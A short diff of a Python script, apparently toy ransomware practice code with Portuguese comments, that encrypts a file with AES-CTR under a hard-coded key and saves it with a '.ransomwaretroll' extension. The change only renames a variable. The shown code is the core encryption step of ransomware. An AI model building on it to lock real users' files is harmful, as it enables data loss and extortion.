@@ -15,10 +15,10 @@ chave = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(chave)
 
 ## criptografar o arquivo
-dados_criptografados = aes.encrypt(dados_arquivo)
+dados_criptografar = aes.encrypt(dados_arquivo)
 
 ## salvar o arquivo criptografado
 novo_arquivo = nome_arquivo + ".ransomwaretroll"
 novo_arquivo = open(f'{novo_arquivo}','wb')
-novo_arquivo.write(dados_criptografados)
+novo_arquivo.write(dados_criptografar)
 novo_arquivo.close()
